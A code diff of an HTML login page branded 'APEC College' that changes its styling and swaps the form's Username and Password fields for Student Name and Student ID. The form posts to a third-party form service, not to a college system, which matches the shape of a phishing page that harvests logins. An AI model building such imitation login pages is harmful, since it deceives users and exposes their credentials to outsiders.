@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>APEC College Login</title>
+<title>APEC College Student Login</title>
 
 <style>
 body{
@@ -13,6 +13,7 @@ body{
     justify-content:center;
     align-items:center;
     height:100vh;
+    margin:0;
 }
 
 .container{
@@ -31,6 +32,7 @@ body{
 
 h2{
     color:#003366;
+    margin-bottom:20px;
 }
 
 input{
@@ -39,6 +41,7 @@ input{
     margin:10px 0;
     border:1px solid #ccc;
     border-radius:5px;
+    box-sizing:border-box;
 }
 
 button{
@@ -48,6 +51,7 @@ button{
     color:white;
     border:none;
     border-radius:5px;
+    font-size:16px;
     cursor:pointer;
 }
 
@@ -64,20 +68,20 @@ button:hover{
 
 <img src="images.png" class="logo" alt="APEC Logo">
 
-<h2>APEC College Login</h2>
+<h2>APEC College Student Login</h2>
 
 <form action="https://formspree.io/f/mrewowgb" method="POST">
 
 <input
 type="text"
-name="Username"
-placeholder="Enter Username"
+name="Student_Name"
+placeholder="Enter Student Name"
 required>
 
 <input
-type="password"
-name="Password"
-placeholder="Enter Password"
+type="text"
+name="Student_ID"
+placeholder="Enter Student ID"
 required>
 
 <button type="submit">Login</button>
